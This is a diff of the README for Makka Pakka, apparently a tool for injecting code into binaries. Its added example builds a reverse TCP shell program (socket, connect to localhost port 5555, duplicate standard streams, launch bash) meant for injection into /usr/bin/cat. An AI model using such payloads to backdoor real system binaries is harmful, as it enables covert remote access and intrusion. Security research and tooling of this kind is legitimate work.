@@ -65,28 +65,29 @@ Options:
 ```
 
 ## Example
+This example shows how makka pakka can be used to inject a reverse TCP shell into
+a standard linux binary (/usr/bin/cat).
+
 Creating a Makka Pakka program file:
 
 ----- reverse_tcp.mkpk -----
 ```
-!link stdlib/network.mkpk
-!link stdlib/syscall.mkpk
-!link stdlib/execve.mkpk
+!link ../lib/stdlib/network.mkpk
+!link ../lib/stdlib/syscall.mkpk
+!link ../lib/stdlib/shell.mkpk
 
 [[data]]
-exit_msg: "Connection Terminated"
-# 5555 in little endian.
-port: 0xb315
-# 127.0.0.1 in little endian.
-addr: 0x0100007f
+PORT: 0xb315
+LOCALHOST_ADDR: 0x0100007f
 
 [[code]]
 [main]
-> socket
-> connect "addr" "port"
-> dup2
-> bin_sh
-> sys_write "exit_msg" 22
+> sys_socket ${AF_INET} ${SOCK_STREAM} 0x0
+mov r9, rax
+> sockaddr_init "LOCALHOST_ADDR" "PORT" ${AF_INET}
+> sys_connect r9 rsp 0x10
+> dup_stdstreams r9
+> bin_bash
 > sys_exit
 ```
 
@@ -187,7 +188,7 @@ source configure.sh
 
 At this point you can use Makka Pakka from within this directory.
 ``` bash
-python3 mkpk.py --help
+python3 src/mkpk.py --help
 ```
 
 For more examples, or a more detailed technical explaination, please check
